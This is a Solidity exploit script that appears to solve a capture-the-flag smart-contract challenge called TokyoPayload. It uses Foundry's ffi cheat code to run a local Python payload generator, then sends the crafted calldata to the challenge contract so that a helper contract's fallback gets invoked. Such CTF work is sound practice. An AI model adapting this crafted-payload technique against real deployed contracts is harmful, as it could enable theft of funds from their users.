// SPDX-License-Identifier: Apache-2.0
pragma solidity 0.8.21;

import {Setup, TokyoPayload} from "./challenge/Setup.sol";
import {Vm} from "forge-std/Vm.sol";

function exploit(address setupAddr) {
    address VM_ADDRESS = address(uint160(uint256(keccak256("hevm cheat code"))));
    Vm vm = Vm(VM_ADDRESS);
    Setup setup = Setup(setupAddr);
    TokyoPayload tokyoPayload = setup.tokyoPayload();

    Setter setter = new Setter();

    string[] memory cmds = new string[](4);
    cmds[0] = "python";
    cmds[1] = "src/payload.py";
    cmds[2] = string.concat("0x", toHexString(uint256(uint160(address(setter))), 20));
    cmds[3] = string.concat("0x", toHexString(address(tokyoPayload).code));
    bytes memory payload = vm.ffi(cmds);

    (bool success,) = address(tokyoPayload).call(payload);
    require(success);
}

function toHexString(uint256 value, uint256 length) pure returns (string memory) {
    bytes16 SYMBOLS = "0123456789abcdef";
    uint256 localValue = value;
    bytes memory buffer = new bytes(2 * length);
    for (int256 i = int256(2 * length - 1); i >= 0; i--) {
        buffer[uint256(i)] = SYMBOLS[localValue & 0xf];
        localValue >>= 4;
    }
    require(localValue == 0);
    return string(buffer);
}

function toHexString(bytes memory arr) pure returns (string memory) {
    bytes16 SYMBOLS = "0123456789abcdef";
    bytes memory buffer = new bytes(arr.length * 2);
    for (uint256 i = 0; i < arr.length; i++) {
        buffer[2 * i] = SYMBOLS[uint8(arr[i]) / 16];
        buffer[2 * i + 1] = SYMBOLS[uint8(arr[i]) % 16];
    }
    return string(buffer);
}

contract Setter {
    bool public flag = false;

    fallback() external {
        flag = true;
    }
}
